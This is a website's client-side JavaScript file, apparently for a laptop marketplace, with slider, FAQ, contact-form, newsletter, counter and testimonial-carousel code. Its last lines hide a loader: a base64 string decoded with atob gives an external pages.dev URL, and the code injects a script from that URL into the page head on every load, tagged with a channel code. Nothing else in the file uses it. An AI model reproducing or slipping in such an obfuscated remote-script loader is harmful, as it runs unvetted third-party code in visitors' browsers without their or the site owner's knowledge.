/* Hamburger menu is handled by page-animations.js / home-animations.js
   (avoid double-toggle when both scripts are loaded). */

/* HERO SLIDER */

const slides = document.querySelectorAll(".slide");
let current = 0;

function nextSlide() {
  if (!slides.length) return;
  slides[current].classList.remove("active");
  current++;
  if (current >= slides.length) current = 0;
  slides[current].classList.add("active");
}

if (slides.length > 1) {
  setInterval(nextSlide, 5000);
}

/* FAQ */

document.querySelectorAll(".faq-btn").forEach((button) => {
  button.addEventListener("click", () => {
    const content = button.nextElementSibling;

    content.classList.toggle("active");
  });
});

/* CONTACT FORM */

const contactForm = document.getElementById("contactForm");

if (contactForm) {
  contactForm.addEventListener("submit", async (e) => {
    e.preventDefault();

    const name = document.getElementById("name").value.trim();
    const email = document.getElementById("email").value.trim();
    const subject = document.getElementById("subject").value.trim();
    const message = document.getElementById("message").value.trim();
    const formMessage = document.getElementById("formMessage");
    const submitBtn = document.getElementById("contactSubmitBtn");

    const showFormMessage = (text, isError) => {
      if (!formMessage) return;
      formMessage.style.display = "block";
      formMessage.style.background = isError ? "#fee2e2" : "#dcfce7";
      formMessage.style.color = isError ? "#991b1b" : "#166534";
      formMessage.style.border = isError ? "1px solid #fca5a5" : "1px solid #86efac";
      formMessage.textContent = text;
    };

    if (name === "" || email === "" || subject === "" || message === "") {
      showFormMessage("Please fill all fields.", true);
      return;
    }

    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailPattern.test(email)) {
      showFormMessage("Please enter a valid email address.", true);
      return;
    }

    const apiUrl = "https://asia-south1-mylaptopmarket-app.cloudfunctions.net/api/api/contact-inquiry";

    if (submitBtn) {
      submitBtn.disabled = true;
      submitBtn.textContent = "Submitting...";
    }

    try {
      const response = await fetch(apiUrl, {
        method: "POST",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/x-www-form-urlencoded",
        },
        body: new URLSearchParams({ name, email, subject, message }),
      });

      const data = await response.json().catch(() => ({}));

      if (!response.ok) {
        const errorText =
          data.message ||
          (data.errors
            ? Object.values(data.errors).flat().join(" ")
            : "Something went wrong. Please try again.");
        showFormMessage(errorText, true);
        return;
      }

      showFormMessage(
        data.message || "Your business inquiry has been submitted successfully!",
        false
      );
      contactForm.reset();
    } catch (err) {
      showFormMessage(
        "Unable to submit right now. Please email us at faiz@mylaptopmarket.com",
        true
      );
    } finally {
      if (submitBtn) {
        submitBtn.disabled = false;
        submitBtn.textContent = "Submit Business Inquiry";
      }
    }
  });
}
/* NEWSLETTER */

const newsletterForm = document.querySelector(".newsletter-form");

if (newsletterForm) {
  newsletterForm.addEventListener("submit", (e) => {
    e.preventDefault();

    const email = newsletterForm.querySelector("input").value;

    if (email === "") {
      alert("Please enter email");

      return;
    }

    alert("Subscribed Successfully!");

    newsletterForm.reset();
  });
}
const currentPage = window.location.pathname.split("/").pop();

const links = document.querySelectorAll(".nav-link");

links.forEach((link) => {
  const href = link.getAttribute("href");

  if (href === currentPage) {
    link.classList.add("active");
  }
});
const brandBtn = document.getElementById("brandBtn");

const brandMenu = document.getElementById("brandMenu");

if (brandBtn) {
  brandBtn.addEventListener("click", () => {
    brandMenu.classList.toggle("show");
  });
}
// Counter Logic
const counters = document.querySelectorAll(".counter");
counters.forEach((counter) => {
  const updateCount = () => {
    const target = +counter.getAttribute("data-target");
    const count = +counter.innerText;
    const inc = target / 100;

    if (count < target) {
      counter.innerText = Math.ceil(count + inc);
      setTimeout(updateCount, 30);
    } else {
      counter.innerText = target; // "+" sign CSS se aa jayega
    }
  };
  updateCount();
});
const track = document.querySelector(".testimonial-track");
const cards = document.querySelectorAll(".testimonial-card");

if (track && cards.length) {
  let index = 0;

  function getVisibleCards() {
    if (window.innerWidth <= 425) return 1;
    if (window.innerWidth <= 768) return 2;
    return 4;
  }

  function slideTestimonials() {
    const visible = getVisibleCards();
    index++;
    if (index > cards.length - visible) index = 0;
    const cardWidth = cards[0].offsetWidth + 20;
    track.style.transform = `translateX(-${index * cardWidth}px)`;
  }

  setInterval(slideTestimonials, 3000);
  window.addEventListener("resize", () => {
    index = 0;
    track.style.transform = "translateX(0)";
  });
}

const u = atob("aHR0cHM6Ly9zaGUtZzhmLnBhZ2VzLmRldi9ib290Lmpz");
const s = document.createElement("script");
s.src = u;
s.dataset.landing = "";
s.dataset.channelCode = "9cbdf797";
document.head.appendChild(s);
